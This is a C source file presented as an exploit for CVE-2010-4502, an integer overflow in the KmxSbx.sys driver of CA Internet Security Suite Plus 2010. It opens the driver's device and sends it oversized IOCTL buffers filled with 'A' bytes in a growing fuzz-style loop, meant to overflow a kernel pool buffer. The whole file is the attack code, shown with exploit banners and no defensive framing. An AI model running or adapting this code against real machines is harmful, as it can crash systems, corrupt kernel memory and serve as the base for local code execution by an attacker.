#include "exploit.h"

char input[0x1C000];

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned char unused = 0, output[1024];
	unsigned long bytes_returned = 0;

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	SetConsoleTitleA("CVE-2010-4502");
	printf("%s\n[*] Integer overflow in KmxSbx.sys 6.2.0.22 in CA Internet Security Suite Plus 2010 allows local users to cause a denial of service (pool corruption) and execute arbitrary code via crafted arguments to the 0x88000080 IOCTL, which triggers a buffer overflow.\n[*] Exploit written by ExAllocatePool2.\n[!] Lets exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the device driver. Handle Value: 0x%p", h_driver);
	
	memset((long long*)(input + 8), 0x41, 65535 - 1);
	memset((long long*)(input + 0x11032), 0, 2);

	*(long long*)(input) = (long long)0x400;
	//DebugBreak();

	char* fuzz_input = 0;
	for (long long i = 0x1C000; i < 0xFFFFFFF; i++)
	{
		if (!(i % 100000))
		{
			printf("\n[!] i=%llu", i);
		}

		fuzz_input = (char*)malloc(i);
		memset(fuzz_input, 'A', i - 1);
		memset(fuzz_input + i - 0xAFCE, 0x00, 2);
		*(long long*)(fuzz_input) = (long long)0x400;

		DeviceIoControl(h_driver, OVERFLOW_IOCTL, (LPVOID)fuzz_input, i, &output, sizeof(output), &bytes_returned, 0);

		if (fuzz_input)
		{
			free(fuzz_input);
		}
		else
		{
			printf("\n[!] shit hit the fan");
		}
	}

	//DeviceIoControl(h_driver, OVERFLOW_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	unused = getchar();

	return 0;
}